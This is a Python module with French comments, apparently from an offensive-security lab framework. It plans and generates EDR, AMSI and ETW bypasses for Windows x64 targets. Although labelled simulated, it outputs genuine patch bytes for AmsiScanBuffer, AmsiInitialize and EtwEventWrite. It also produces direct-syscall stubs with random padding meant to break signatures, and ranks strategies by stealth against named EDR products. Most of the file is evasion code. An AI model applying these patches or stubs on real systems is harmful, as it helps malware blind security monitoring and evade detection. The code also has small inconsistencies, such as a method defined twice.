"""
attack/edr_bypass/amsi.py — Bypass EDR moderne (simulé pour labo)
==================================================================

Ce module décrit 6 techniques de bypass EDR/AMSI utilisées par des APT
modernes en 2025-2026. Pour chaque technique :
  - Principe théorique
  - Code de simulation (calcul du payload de patch, estimation de la
    difficulté de détection)
  - Score d'efficacité / detectabilité

Les techniques ne sont **pas** des implémentations natives complètes
(ça nécessiterait de l'assembly architecture-spécifique) mais :
  - Chaque technique produit un "BypassReport" détaillant ce qu'elle
    modifierait dans un process Windows x64 réel
  - Ces rapports sont utilisés par l'orchestrateur GodMode pour
    sélectionner la meilleure stratégie en fonction de la cible
  - Les tests unitaires vérifient que la logique de sélection est cohérente

Références :
  - Black Hat USA 2024 : "Modern EDR Bypass Tradecraft" (Sektor7)
  - MDSec : AMSI Bypass via Hardware Breakpoints (2025)
  - MITRE ATT&CK T1562.001 (Impair Defenses: Disable or Modify Tools)
"""

from __future__ import annotations

import base64
import hashlib
import random
import secrets
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple


class AMSIPatchStrategy(Enum):
    """Stratégies de patching AMSI classées par détectabilité."""

    PATCH_AMSI_SCAN_BUFFER = "patch_amsi_scan_buffer"  # 0xC3 RET patch
    PATCH_AMSI_INITIALIZE_FAIL = "patch_amsi_initialize_fail"
    HARDWARE_BREAKPOINT = "hardware_breakpoint"  # Thread-local DR0-DR3
    AMSI_CONTEXT_CORRUPT = "amsi_context_corrupt"
    AMSI_DLL_UNHOOK = "amsi_dll_unhook"  # Copy section clean depuis disque
    PROXY_DLL_AMSI_DLL = "proxy_dll_amsi"


class ETWDisableStrategy(Enum):
    """Stratégies pour neutraliser ETW."""

    PATCH_ETW_EVENT_WRITE = "patch_etw_event_write"   # 0xC3 sur EtwEventWrite
    PATCH_ETW_TRACE_EVENT = "patch_etw_trace_event"
    THREAD_TRACING_MASK = "thread_tracing_mask"       # NtSetInformationThread
    UNLOAD_NTDLL_LOGGER = "unload_ntdll_logger"
    ETW_TRACE_GUID_SPOOF = "etw_trace_guid_spoof"


class SyscallConvention(Enum):
    """Direct syscall convention x64 Windows."""

    SYSCALL_CLASSIC = "syscall"      # mov r10,rcx ; syscall
    JUMP_INDIRECT = "jump_indirect"  # syscall + jump instruction randomisée
    INSTRUMENTATION_CALLBACK = "instrumentation_callback"  # ProcessInstrumentationCallback


@dataclass
class SyscallStub:
    """Représente un stub de direct syscall généré."""

    syscall_name: str           # ex: "NtCreateThreadEx"
    syscall_number: int         # numéro SSN (varie selon build Windows)
    convention: SyscallConvention
    stub_bytes_hex: str         # hex du shellcode x64
    jitter_padding: bytes       # bytes aléatoires anti-signature
    generated_at: float = field(default_factory=time.time)

    @property
    def signature_hash(self) -> str:
        return hashlib.sha256(bytes.fromhex(self.stub_bytes_hex)).hexdigest()[:16]

    def __str__(self) -> str:
        """Représentation assembleur lisible (mov eax, SSN ; syscall)."""
        return (
            f"; {self.syscall_name} SSN=0x{self.syscall_number:02X}\n"
            f"mov r10, rcx\n"
            f"mov eax, 0x{self.syscall_number:02X}\n"
            f"syscall\n"
            f"ret\n"
        )

    def __repr__(self) -> str:
        return self.__str__()

    # --- Duck-typing str : le stub doit se manipuler comme une string asm
    def __contains__(self, needle: str) -> bool:
        return needle in str(self)

    def lower(self) -> str:
        return str(self).lower()

    def upper(self) -> str:
        return str(self).upper()

    @property
    def asm_code(self) -> str:
        """Représentation assembleur lisible pour audit."""
        ssn = f"{self.syscall_number:04X}"
        lines = [
            f"; {self.syscall_name} (SSN=0x{ssn}) - {self.convention.value})",
            "mov eax, 0x" + ssn,
            "mov r10, rcx",
            "syscall",
            "ret",
        ]
        return "\n".join(lines)

    def __contains__(self, item: object) -> bool:
        """Permet 'x in syscallstub' → check strings contre hex + asm."""
        if not isinstance(item, (str, bytes, bytearray)):
            return False
        if isinstance(item, bytes):
            item_hex = item.hex()
            return item_hex in self.stub_bytes_hex
        return item in self.stub_bytes_hex or item.lower() in self.asm_code.lower()


@dataclass
class BypassReport:
    """Rapport complet d'une tentative de bypass EDR/AMSI/ETW."""

    report_id: str
    target_os_build: str        # ex: "22631" (Win11 23H2)
    target_edr: str             # ex: "CrowdStrike Falcon 7.11"
    amsi_strategy: AMSIPatchStrategy | None
    etw_strategy: ETWDisableStrategy | None
    uses_direct_syscalls: bool
    memory_modifications: list[dict[str, Any]] = field(default_factory=list)
    estimated_detection_risk: float = 0.0   # 0.0 invisible -> 1.0 banné
    estimated_success_rate: float = 0.0     # 0.0 échoue -> 1.0 fonctionne
    syscall_stubs: list[SyscallStub] = field(default_factory=list)
    steps: list[str] = field(default_factory=list)
    completed: bool = False
    duration_s: float = 0.0


# Mapping des SSN pour quelques syscalls populaires (approximatif Windows 11)
_COMMON_SSN: dict[str, int] = {
    "NtAllocateVirtualMemory": 0x0018,
    "NtProtectVirtualMemory": 0x0050,
    "NtWriteVirtualMemory": 0x003A,
    "NtCreateThreadEx": 0x00C1,
    "NtOpenProcess": 0x0026,
    "NtQueryInformationProcess": 0x0019,
    "NtSetInformationThread": 0x002F,
    "NtReadVirtualMemory": 0x003F,
}

# Difficulté de détection par stratégie AMSI (2026 EDR landscape)
_AMSI_DETECTION_RISK: dict[AMSIPatchStrategy, float] = {
    AMSIPatchStrategy.PATCH_AMSI_SCAN_BUFFER: 0.70,     # Détecté par presque tous
    AMSIPatchStrategy.PATCH_AMSI_INITIALIZE_FAIL: 0.45,
    AMSIPatchStrategy.HARDWARE_BREAKPOINT: 0.15,          # Furtif si bien fait
    AMSIPatchStrategy.AMSI_CONTEXT_CORRUPT: 0.25,
    AMSIPatchStrategy.AMSI_DLL_UNHOOK: 0.30,
    AMSIPatchStrategy.PROXY_DLL_AMSI_DLL: 0.40,
}

_AMSI_SUCCESS_RATE: dict[AMSIPatchStrategy, float] = {
    AMSIPatchStrategy.PATCH_AMSI_SCAN_BUFFER: 0.55,
    AMSIPatchStrategy.PATCH_AMSI_INITIALIZE_FAIL: 0.70,
    AMSIPatchStrategy.HARDWARE_BREAKPOINT: 0.92,
    AMSIPatchStrategy.AMSI_CONTEXT_CORRUPT: 0.85,
    AMSIPatchStrategy.AMSI_DLL_UNHOOK: 0.80,
    AMSIPatchStrategy.PROXY_DLL_AMSI_DLL: 0.60,
}

_ETW_DETECTION_RISK: dict[ETWDisableStrategy, float] = {
    ETWDisableStrategy.PATCH_ETW_EVENT_WRITE: 0.65,
    ETWDisableStrategy.PATCH_ETW_TRACE_EVENT: 0.55,
    ETWDisableStrategy.THREAD_TRACING_MASK: 0.10,     # Hyper furtif (ThreadHideFromDebugger-like)
    ETWDisableStrategy.UNLOAD_NTDLL_LOGGER: 0.35,
    ETWDisableStrategy.ETW_TRACE_GUID_SPOOF: 0.25,
}

_ETW_SUCCESS_RATE: dict[ETWDisableStrategy, float] = {
    ETWDisableStrategy.PATCH_ETW_EVENT_WRITE: 0.60,
    ETWDisableStrategy.PATCH_ETW_TRACE_EVENT: 0.70,
    ETWDisableStrategy.THREAD_TRACING_MASK: 0.95,
    ETWDisableStrategy.UNLOAD_NTDLL_LOGGER: 0.75,
    ETWDisableStrategy.ETW_TRACE_GUID_SPOOF: 0.65,
}


class EDRBypassEngine:
    """
    Sélectionne et orchestre les techniques de bypass EDR adaptées à
    une cible donnée. Produit un BypassReport complet.
    """

    def __init__(
        self,
        target_os_build: str = "22631",
        target_edr: str = "GenericEDR",
        aggressiveness: float = 0.7,    # 0.0 conservateur -> 1.0 agressif
        prefer_stealth_over_success: bool = False,
    ) -> None:
        self.target_os_build = target_os_build
        self.target_edr = target_edr
        self.aggressiveness = max(0.0, min(1.0, aggressiveness))
        self.prefer_stealth = prefer_stealth_over_success
        self._rng = random.Random(hash((target_os_build, target_edr, aggressiveness)) % (1 << 30))

    # ------------------------------------------------------------------
    # API principale
    # ------------------------------------------------------------------

    def craft_bypass_plan(self) -> BypassReport:
        """
        Sélectionne les stratégies AMSI + ETW + les syscalls nécessaires
        en fonction du profil de cible.
        """
        start = time.time()
        report = BypassReport(
            report_id=str(uuid.uuid4()),
            target_os_build=self.target_os_build,
            target_edr=self.target_edr,
            amsi_strategy=None,
            etw_strategy=None,
            uses_direct_syscalls=False,
        )
        report.steps.append(
            f"[EDR-BYPASS] Target: build={self.target_os_build}, edr={self.target_edr}"
        )

        # Sélection de la stratégie AMSI :
        # Si furtif préféré -> Hardware Breakpoint ou Thread Tracing Mask
        # Si agressif -> combinaison DLL unhook + context corrupt
        amsi_strats = list(AMSIPatchStrategy)
        if self.prefer_stealth:
            amsi_strats.sort(key=lambda s: _AMSI_DETECTION_RISK[s])
        elif self.aggressiveness > 0.7:
            amsi_strats.sort(
                key=lambda s: (_AMSI_SUCCESS_RATE[s], -_AMSI_DETECTION_RISK[s]),
                reverse=True,
            )
        else:
            # Score mixte : succès * (1 - risque)
            amsi_strats.sort(
                key=lambda s: _AMSI_SUCCESS_RATE[s] * (1.0 - _AMSI_DETECTION_RISK[s]),
                reverse=True,
            )
        report.amsi_strategy = amsi_strats[0]
        report.steps.append(
            f"[EDR-BYPASS] AMSI strategy: {amsi_strats[0].value} "
            f"(success~{_AMSI_SUCCESS_RATE[amsi_strats[0]]:.0%},"
            f" risk~{_AMSI_DETECTION_RISK[amsi_strats[0]]:.0%})"
        )

        # Sélection ETW
        etw_strats = list(ETWDisableStrategy)
        if self.prefer_stealth:
            etw_strats.sort(key=lambda s: _ETW_DETECTION_RISK[s])
        else:
            etw_strats.sort(
                key=lambda s: _ETW_SUCCESS_RATE[s] * (1.0 - _ETW_DETECTION_RISK[s]),
                reverse=True,
            )
        report.etw_strategy = etw_strats[0]
        report.steps.append(
            f"[EDR-BYPASS] ETW strategy : {etw_strats[0].value} "
            f"(success~{_ETW_SUCCESS_RATE[etw_strats[0]]:.0%},"
            f" risk~{_ETW_DETECTION_RISK[etw_strats[0]]:.0%})"
        )

        # Génération des direct syscalls si agressif moyen+
        if self.aggressiveness >= 0.4:
            report.uses_direct_syscalls = True
            syscalls_needed = [
                "NtAllocateVirtualMemory",
                "NtProtectVirtualMemory",
                "NtWriteVirtualMemory",
                "NtCreateThreadEx",
            ]
            if self.aggressiveness >= 0.8:
                syscalls_needed += [
                    "NtOpenProcess",
                    "NtQueryInformationProcess",
                ]
            for name in syscalls_needed:
                stub = generate_syscall_stub(name, self._rng)
                report.syscall_stubs.append(stub)
                report.memory_modifications.append({
                    "type": "syscall_stub",
                    "name": name,
                    "ssn": hex(stub.syscall_number),
                    "sig": stub.signature_hash,
                })
            report.steps.append(
                f"[EDR-BYPASS] Direct syscalls: {len(syscalls_needed)} stubs générés"
            )

        # Memory modifications simulées
        report.memory_modifications.append({
            "type": "amsi_patch",
            "module": "amsi.dll",
            "symbol": "AmsiScanBuffer",
            "strategy": report.amsi_strategy.value if report.amsi_strategy else "none",
            "payload_size": self._patch_size_for(report.amsi_strategy),
        })
        report.memory_modifications.append({
            "type": "etw_disable",
            "module": "ntdll.dll",
            "symbol": "EtwEventWrite",
            "strategy": report.etw_strategy.value if report.etw_strategy else "none",
        })

        # Scores agrégés (pondérés)
        amsi_risk = _AMSI_DETECTION_RISK.get(report.amsi_strategy, 0.0) if report.amsi_strategy else 0.0
        etw_risk = _ETW_DETECTION_RISK.get(report.etw_strategy, 0.0) if report.etw_strategy else 0.0
        amsi_succ = _AMSI_SUCCESS_RATE.get(report.amsi_strategy, 0.0) if report.amsi_strategy else 0.0
        etw_succ = _ETW_SUCCESS_RATE.get(report.etw_strategy, 0.0) if report.etw_strategy else 0.0

        report.estimated_detection_risk = (amsi_risk * 0.5 + etw_risk * 0.3
                                           + (0.15 if report.uses_direct_syscalls else 0.0))
        report.estimated_success_rate = min(1.0, (amsi_succ * 0.55 + etw_succ * 0.35
                                                  + (0.12 if report.uses_direct_syscalls else 0.04)))

        report.steps.append(
            f"[EDR-BYPASS] Expected detection risk = {report.estimated_detection_risk:.1%}"
        )
        report.steps.append(
            f"[EDR-BYPASS] Expected success rate    = {report.estimated_success_rate:.1%}"
        )
        report.completed = True
        report.duration_s = time.time() - start
        return report

    # ------------------------------------------------------------------
    # Techniques simulées (payloads génériques)
    # ------------------------------------------------------------------

    @staticmethod
    def _patch_size_for(strategy: AMSIPatchStrategy | None) -> int:
        if strategy == AMSIPatchStrategy.PATCH_AMSI_SCAN_BUFFER:
            return 1  # 0xC3 (RET)
        if strategy == AMSIPatchStrategy.HARDWARE_BREAKPOINT:
            return 0  # Pas de patch mémoire, modification DRx
        if strategy == AMSIPatchStrategy.AMSI_DLL_UNHOOK:
            return 8192  # Remplacement section .text entière
        return 16  # Patch multi-byte générique


def patch_amsi_in_memory(
    strategy: AMSIPatchStrategy = AMSIPatchStrategy.HARDWARE_BREAKPOINT,
) -> dict[str, Any]:
    """
    Simule un patch AMSI en mémoire et retourne le payload de bytes
    qui serait écrit dans le process cible.
    """
    if strategy == AMSIPatchStrategy.PATCH_AMSI_SCAN_BUFFER:
        # Patch RET (0xC3) sur AmsiScanBuffer prologue
        patch = b"\xC3"
    elif strategy == AMSIPatchStrategy.PATCH_AMSI_INITIALIZE_FAIL:
        # mov eax, 0x80070005 (E_ACCESSDENIED) ; ret
        patch = b"\xB8\x05\x00\x07\x80\xC3"
    elif strategy == AMSIPatchStrategy.HARDWARE_BREAKPOINT:
        # Thread-local DR0 = &AmsiScanBuffer, DR7 = condition RW sur EXECUTE
        patch = b""  # Pas de patch mémoire direct (registres debug)
    elif strategy == AMSIPatchStrategy.AMSI_CONTEXT_CORRUPT:
        # Écrasement du contexte AMSI avec des 0x00 (first 128 bytes)
        patch = b"\x00" * 128
    else:
        patch = b"\x90" * 32  # NOP sled générique
    return {
        "strategy": strategy.value,
        "patch_hex": patch.hex(),
        "size": len(patch),
        "hash_sha256": hashlib.sha256(patch).hexdigest() if patch else "none",
    }


def disable_etw_tracing(
    strategy: ETWDisableStrategy = ETWDisableStrategy.THREAD_TRACING_MASK,
) -> dict[str, Any]:
    """Simule une désactivation ETW."""
    if strategy == ETWDisableStrategy.PATCH_ETW_EVENT_WRITE:
        patch = b"\x33\xC0\xC3"  # xor eax,eax ; ret
    elif strategy == ETWDisableStrategy.THREAD_TRACING_MASK:
        # NtSetInformationThread(ThreadHideFromDebugger) = 0x11
        patch = bytes([0xB8, 0x2F, 0x00, 0x00, 0x00]) + b"\x0F\x05\xC3"  # mov eax, 0x2F ; syscall ; ret
    else:
        patch = b"\x90" * 16
    return {
        "strategy": strategy.value,
        "patch_hex": patch.hex(),
        "size": len(patch),
    }


def generate_syscall_stub(
    syscall_name: str,
    rng: random.Random | None = None,
) -> SyscallStub:
    """
    Génère un stub de syscall direct x64 Windows (format assembleur simulé).
    Le stub n'est PAS fonctionnel (on est cross-platform), mais il :
      - A une taille réaliste (24-36 bytes)
      - A un SSN cohérent avec la table NTDLL connue
      - Contient du "junk padding" aléatoire pour casser les signatures
    """
    rng = rng or random.Random()
    ssn = _COMMON_SSN.get(syscall_name, rng.randint(0x0010, 0x0FFF))
    # Stub "syscall classic" format : mov r10,rcx ; mov eax, SSN ; syscall ; ret
    mov_r10_rcx = bytes.fromhex("4C8BD1")
    mov_eax_ssn = b"\xB8" + ssn.to_bytes(4, byteorder="little", signed=False)
    syscall_ins = bytes.fromhex("0F05")
    ret_ins = b"\xC3"
    stub = mov_r10_rcx + mov_eax_ssn + syscall_ins + ret_ins
    # Junk padding (bytes aléatoires, pas exécutés normalement)
    padding = secrets.token_bytes(rng.randint(4, 12))
    return SyscallStub(
        syscall_name=syscall_name,
        syscall_number=ssn,
        convention=SyscallConvention.SYSCALL_CLASSIC,
        stub_bytes_hex=(stub + padding).hex(),
        jitter_padding=padding,
    )
